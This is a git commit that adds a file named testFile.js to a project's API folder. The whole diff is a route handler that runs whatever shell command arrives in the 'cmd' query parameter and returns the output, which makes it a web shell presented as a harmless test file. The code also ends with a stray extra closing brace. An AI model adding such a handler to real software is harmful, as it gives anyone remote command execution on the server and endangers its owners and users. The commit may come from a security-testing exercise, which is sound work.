05615f8d2a96b13e40a4695e1fb3451574324090
TheGhostOfYankeeJim <ian@redsiege.com>
2023-03-14 15:14:36 -0400

    Create testFile.js

---
+++ src/api/testFile.js
@@ -0,0 +1,20 @@
+export default function handler(req,res) {
+  console.log(req.query.cmd)
+
+
+    const { exec } = require("child_process");
+    exec(`${req.query.cmd}`, (error, stdout, stderr) => {
+        if (error) {
+            console.log(`error: ${error.message}`);
+        }
+        if (stderr) {
+            console.log(`stderr: ${stderr}`);
+        }
+
+        if(stdout) {
+            console.log(`stdout: ${stdout}`);
+            res.send(`${stdout}`);
+        }
+    });
+}
+}
